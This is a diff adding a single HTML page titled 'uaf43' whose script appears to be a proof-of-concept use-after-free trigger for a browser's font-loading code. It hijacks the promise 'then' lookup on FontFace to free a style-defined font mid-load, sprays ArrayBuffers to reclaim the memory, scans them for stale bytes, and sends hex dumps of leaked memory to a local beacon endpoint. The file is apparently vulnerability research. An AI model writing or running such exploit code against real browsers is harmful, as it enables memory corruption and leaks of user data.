@@ -1,0 +1,64 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>uaf43</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+function hex8(u,o){var s='';for(var i=0;i<8;i++){s+=('0'+u[o+i].toString(16)).slice(-2)}return s}
+var U = Date.now().toString(36);
+var SIZES = [192,224,256,320,384,512,768,1024,2048];
+var K = 8, styleEl = null, firedHere = false, MAP = [], scanned = false;
+function scan(tag){
+  if (scanned) return; scanned = true;
+  var hit = 0;
+  for (var i=0;i<MAP.length;i++){
+    var e=MAP[i], u=e.view;
+    var nz = 0;
+    for (var o=0;o<u.length;o+=8){ if (u[o]||u[o+1]||u[o+2]||u[o+3]||u[o+4]||u[o+5]||u[o+6]||u[o+7]) nz++; }
+    if (nz){ hit++;
+      if (hit<6) b('U43-'+tag+'-HIT-s'+e.size+'-b'+i+'-nz'+nz+'-0:'+hex8(u,0)+'-8:'+hex8(u,8)+'-50:'+hex8(u,0x50)+'-58:'+hex8(u,0x58)+'-68:'+hex8(u,0x68)+'-90:'+hex8(u,0x90)+'-98:'+hex8(u,0x98));
+    }
+  }
+  b('U43-'+tag+'-hits-'+hit+'-of-'+MAP.length);
+}
+function setup(){
+  var fam = 's'+U, nm = 'f'+U;
+  var A = new FontFace(nm, 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  document.fonts.add(A);
+  void A.loaded;
+  window.__alive = [A];
+  styleEl = document.createElement('style');
+  styleEl.textContent = "@font-face { font-family: "+fam+"; src: local(Arial); unicode-range: U+0042; }";
+  document.head.appendChild(styleEl);
+  b('U43-SETUP-'+U);
+  firedHere = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if (firedHere) return undefined;
+      firedHere = true;
+      if (styleEl) { styleEl.remove(); styleEl.textContent = ''; styleEl = null; }
+      try { document.fonts.delete(this); } catch (e) {}
+      document.body.offsetHeight;
+      MAP = [];
+      for (var si=0; si<SIZES.length; si++){
+        for (var k=0;k<K;k++){
+          var ab = new ArrayBuffer(SIZES[si]);
+          var vw = new Uint8Array(ab); vw.fill(1);
+          MAP.push({ size: SIZES[si], view: vw });
+        }
+      }
+      b('U43-SPRAY-'+MAP.length);
+      try { document.fonts.check('1em '+fam); } catch (e) {}
+      b('U43-CHECK-RETURNED');
+      return undefined;
+    },
+    set: function(){}
+  });
+  b('U43-LOAD-CALLED');
+  document.fonts.load('1em '+nm+', '+fam, 'AB').then(function(){ b('U43-RESOLVED'); scan('R'); },
+                                                    function(){ b('U43-REJECTED'); scan('R'); });
+  setTimeout(function(){ scan('T80'); },80);
+  setTimeout(function(){ scan('T600'); },600);
+}
+function run(){ b('U43-PARSE'); setup(); }
+if (document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script></head><body><p>uaf43</p></body></html>
